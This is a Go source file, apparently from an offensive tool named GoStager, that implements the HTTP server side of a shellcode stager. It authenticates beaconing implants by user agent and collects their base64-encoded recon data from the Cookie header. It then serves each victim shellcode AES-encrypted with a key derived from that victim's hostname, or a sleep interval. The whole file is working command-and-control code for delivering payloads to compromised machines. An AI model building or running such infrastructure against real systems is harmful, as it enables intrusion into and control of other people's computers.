package http

import (
	"GoStager/config"
	"GoStager/util"
	b64 "encoding/base64"
	"errors"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"net/http"
	"strings"
)

type Kitten struct {
	Target     string
	Shellcode  []byte
	Id         int
	InitChecks util.InitChecks
}

var (
	userA string
	M     map[string]*Kitten
)

func CreateHttpServer(conf config.General) {
	M = map[string]*Kitten{"all targets": {
		Target:    "all targets",
		Shellcode: []byte(fmt.Sprintf("%d", conf.GetSleep())),
		Id:        len(M),
	}}
	address := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
	userA = conf.GetUserAgent()
	fmt.Printf("%s %s\n\n", color.Green("[+] Started http server on"), color.Yellow(address))
	http.HandleFunc(conf.Conf.EndPoint, logRequest)
	err := http.ListenAndServe(address, nil)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// HostShellcode Hosts the Shellcode
func HostShellcode(path string, ip string) error {
	var err error
	if M[ip].InitChecks.Hostname == "" {
		return errors.New("wait for the implant to call back")
	}
	key := util.GenerateKey(M[ip].InitChecks.Hostname, 32)
	shellcode, err := util.ScToAES(path, key)
	M[ip].Shellcode = shellcode
	fmt.Println(color.Green("[+] Shellcode hosted for " + ip))
	if err != nil {
		return err
	}
	return error(nil)
}

func HostSleep(t int, ip string) {
	M[ip].Shellcode = []byte(fmt.Sprintf("%d", t))
	fmt.Printf("%s %d%s %s%s\n", color.Green("[+] Sleep time set to"), color.Yellow(t), color.Yellow("s"), color.Green("on "), color.Yellow(ip))
}

// Logs the requests from the beacons
func logRequest(w http.ResponseWriter, r *http.Request) {
	userAgent := r.UserAgent()
	//check user agent
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	addr := strings.Split(r.RemoteAddr, ":")
	//Check if the beacon is already in the map
	if _, ok := M[addr[0]]; ok {
		_, err := w.Write(M[addr[0]].Shellcode)
		if err != nil {
			return
		}
		return
	} else {
		M[addr[0]] = &Kitten{
			Target:    addr[0],
			Id:        len(M),
			Shellcode: M["all targets"].Shellcode, //Set the shellcode to the default sleep time
		}
		_, err := w.Write(M[addr[0]].Shellcode)
		if err != nil {
			return
		}
		fmt.Printf("\n%s %s\n", color.Green("[+] Request from:"), color.Yellow(addr[0]))
		fmt.Printf("%s %s\n", color.Green("[+] User-Agent:"), color.Yellow(r.UserAgent()))
		//Get recon data
		cookie := r.Header.Get("Cookie")
		if cookie != "" {
			out, err := b64.StdEncoding.DecodeString(cookie)
			M[addr[0]].InitChecks = util.UnmarshalJSON(out)
			if err != nil {
				fmt.Println(color.Red("[!] Error decoding cookie"))
			}
			util.PrintCookie(out)
		}
	}
}
